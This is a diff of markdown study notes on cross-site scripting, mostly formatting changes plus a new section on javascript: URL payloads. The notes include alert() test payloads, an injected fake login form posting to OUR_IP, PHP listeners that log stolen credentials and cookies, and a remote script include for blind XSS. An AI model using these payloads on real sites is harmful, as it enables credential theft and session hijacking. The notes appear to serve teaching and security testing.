@@ -16,7 +16,7 @@ This makes this type of XSS the most critical, as it affects a much wider audien
 
 ```<script>alert(window.origin)</script>```
 
-As some modern browsers may block the alert() JavaScript function in specific locations, it may be handy to know a few other basic XSS payloads to verify the existence of XSS. One such XSS payload is <plaintext>, which will stop rendering the HTML code that comes after it and display it as plaintext. Another easy-to-spot payload is <script>print()</script> that will pop up the browser print dialog, which is unlikely to be blocked by any browsers.
+As some modern browsers may block the alert() JavaScript function in specific locations, it may be handy to know a few other basic XSS payloads to verify the existence of XSS. One such XSS payload is ```<plaintext>```, which will stop rendering the HTML code that comes after it and display it as plaintext. Another easy-to-spot payload is ```<script>print()</script>``` that will pop up the browser print dialog, which is unlikely to be blocked by any browsers.
 
 # Reflected XSS
 
@@ -41,7 +41,7 @@ Furthermore, some of the jQuery library functions that write to DOM objects are:
 - after();
 - append().
 
-If we try the XSS payload we have been using previously, we will see that it will not execute. This is because the innerHTML function does not allow the use of the <script> tags within it as a security feature. Still, there are many other XSS payloads we use that do not contain <script> tags, like the following XSS payload:
+If we try the XSS payload we have been using previously, we will see that it will not execute. This is because the innerHTML function does not allow the use of the ```<script>``` tags within it as a security feature. Still, there are many other XSS payloads we use that do not contain ```<script>``` tags, like the following XSS payload:
 
 ```<img src="" onerror=alert(window.origin)>```
 
@@ -83,7 +83,7 @@ document.write('<h3>Please login to continue</h3><form action=http://OUR_IP><inp
 
 We need to set a listener to steal credentials (example in php code):
 
-```
+```php
 <?php
 if (isset($_GET['username']) && isset($_GET['password'])) {
     $file = fopen("creds.txt", "a+");
@@ -95,8 +95,8 @@ if (isset($_GET['username']) && isset($_GET['password'])) {
 ?>
 ```
 
-We can start this index.php with something like that:
-```
+We can start this ```index.php``` with something like that:
+```bash
 mkdir /tmp/tmpserver
 cd /tmp/tmpserver
 Put our index.php inside this directory
@@ -109,7 +109,7 @@ Modern web applications utilize cookies to maintain a user's session throughout 
 
 With the ability to execute JavaScript code on the victim's browser, we may be able to collect their cookies and send them to our server to hijack their logged-in session by performing a Session Hijacking (aka Cookie Stealing) attack.
 
-## Blind XSS
+### Blind XSS
 A Blind XSS vulnerability occurs when the vulnerability is triggered on a page we don't have access to.
 
 Blind XSS vulnerabilities usually occur with forms only accessible by certain users (e.g., Admins). Some potential examples include:
@@ -133,9 +133,9 @@ However, this introduces two issues:
 - How can we know which specific field is vulnerable? Since any of the fields may execute our code, we can't know which of them did.
 - How can we know what XSS payload to use? Since the page may be vulnerable, but the payload may not work?
 
-## Loading a remote script
+### Loading a remote script
 
-In HTML, we can write JavaScript code within the <script> tags, but we can also include a remote script by providing its URL, as follows:
+In HTML, we can write JavaScript code within the ```<script>``` tags, but we can also include a remote script by providing its URL, as follows:
 
 ```<script src="http://OUR_IP/script.js"></script>```
 
@@ -165,7 +165,7 @@ With our PHP server running, we can now use the code as part of our XSS payload,
 
 Example of index.php to steal cookies:
 
-```
+```php
 <?php
 if (isset($_GET['c'])) {
     $list = explode(";", $_GET['c']);
@@ -178,3 +178,47 @@ if (isset($_GET['c'])) {
 }
 ?>
 ```
+
+
+# Javascript:(code) use
+
+You can use this function to execute JS code directly. 
+
+### Anchor href attribute (```<a href="javascript:()>"```)
+For example, there is a JQuery function which writes inside the href tag of an anchor HTML element the value passed by the user in the query URL.
+
+If the user send ```<javascript:(code)>``` in the URL parameter, so the resulting anchor tag will contains and execute the javascript code.
+
+### Other uses
+This function can be used also in this situations:
+-  In some contexts, tags such as ```<iframe>```, ```<img>``` and ```<embed>``` accept a URL in ```src``` or ```date```, but in some older versions of browsers it was possible to use ```javascript:(code)```;
+- **Event handler (e.g.: onload, onerror)**: ```<img src="invalid.jpg" onerror="javascript:alert('XSS!')">```;
+- **Reflected XSS**: using ```https://example.com/page?url=javascript:alert('XSS!')``` will result in ```<p>View the page: <a href="javascript:alert('XSS!')">Click here</a></p>```;
+- **JSON/JS injections**:
+    ```html
+    <script>
+        var url = "{USER_INPUT}";
+        window.location.href = url;
+    </script>
+    ```
+    
+    Using:
+    ```js
+    javascript:alert('XSS!')
+    ```
+
+    Will results in:
+    ```html
+    <script>
+        var url = "javascript:alert('XSS!')";
+        window.location.href = "javascript:alert('XSS!')";
+    </script>
+    ```
+
+- **CSS ```url()```**: in some older browsers it was possible to use ```javascript:()``` in the ```url()``` inside CSS:
+    ```css
+    body {
+        background-image: url("javascript:alert('XSS!')");
+    }
+    ```
+
